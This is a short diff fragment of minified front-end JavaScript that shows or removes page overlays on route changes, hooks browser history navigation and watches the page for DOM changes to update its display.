+    else if(isLevRoute()){if(!document.getElementById('se-lev-overlay'))setTimeout(buildLevantar,120);if(document.getElementById('se-overlay'))destroyOverlay();}
+    else{if(document.getElementById('se-overlay'))destroyOverlay();if(document.getElementById('se-lev-overlay'))destroyLevantar();}
+  }
   function patchHistory(){var o={pushState:history.pushState,replaceState:history.replaceState};['pushState','replaceState'].forEach(function(m){history[m]=function(){var r=o[m].apply(this,arguments);setTimeout(checkRoute,80);return r;};});window.addEventListener('popstate',function(){setTimeout(checkRoute,80);});}
   function watch(){if(typeof MutationObserver==='undefined')return;var mo=new MutationObserver(function(){markStepRows();observeRows();applyHeroEnter();cacheImgs();forceReveal();});mo.observe(document.body,{childList:true,subtree:true});}
 
